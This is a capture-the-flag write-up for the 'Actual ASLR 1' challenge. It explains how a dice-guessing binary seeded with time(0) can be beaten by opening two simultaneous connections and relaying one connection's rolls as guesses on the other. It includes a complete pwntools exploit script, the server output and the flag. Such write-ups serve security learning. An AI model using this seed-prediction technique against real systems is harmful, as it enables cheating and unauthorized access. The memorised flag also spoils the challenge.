# Actual ASLR 1
> Difficulty: Easy  
> Author: LiveOverflow

Prove that you can win 0xf times against the house. Then go to Vegas.

Challenge Files: [aaslr.zip](./aaslr.zip)

We were given one zip file. Extracting it, gives us several files: [aaslr](./aaslr), [Dockerfile](./Dockerfile), [flag1](./flag1), [flag2](./flag2), [ynetd](./ynetd)

There seems to be two flags in this challange but I only focus on getting one.

The most interesting file is the binary file [aaslr](./aaslr) which provides us some interaction to:
1. throw dice
2. create entry
3. read entry
4. take a guess

Disassembling this file gives us several information:
1. We need to guess dices correctly 0xf times to be able read the content of [flag2](./flag2)
2. On the function `init_heap`, program pass `time(0)` as a parameter to `raninit` function

With those two information, we can guess that the program is using `time(0)` as a seed for randomization. This can be abused since `time` is only second-precise.  

The idea, is to open two consecutive connection running at the same time, one of which will be used to see the output of throwing a dice (through menu number 1 `throw dice`), the other will be used to guess.

Here is the full exploit:
```py
from pwn import *
import threading

p1 = null
p2 = null


def thread_function(p):
    global p1
    global p2
    l = listen()
    if(p == '1'): 
        p1 = process(['ncat', '--ssl', '7b000000c26cc46a36b15357.challenges.broker5.allesctf.net', '1337'])
        # p1 = process('./aaslr')
    elif (p == '2'):
        p2 = process(['ncat', '--ssl', '7b000000c26cc46a36b15357.challenges.broker5.allesctf.net', '1337'])
        # p2 = process('./aaslr')

def throw_dice(p):
    p.recvuntil('Select menu Item:')
    p.sendline('1')
    p.recvuntil('[>] Threw dice: ')
    return p.recvuntil('\n')[:-1]

def take_guess(p1, p2):
    p1.recvuntil('Select menu Item:')
    p1.sendline('4')
    for i in range(0xf):
        p1.recvuntil(' guess next dice roll:')
        p1.sendline(throw_dice(p2))

x = threading.Thread(target=thread_function, args=('1',))
y = threading.Thread(target=thread_function, args=('2',))
x.start()
y.start()
x.join()
y.join()

take_guess(p1,p2)
p1.interactive()
```

Output: 
```
[>] CORRECT! You should go to Vegas.
ALLES{ILLEGAL_CARD_COUNTING!_BANNED}
```

Flag: ALLES{ILLEGAL_CARD_COUNTING!_BANNED}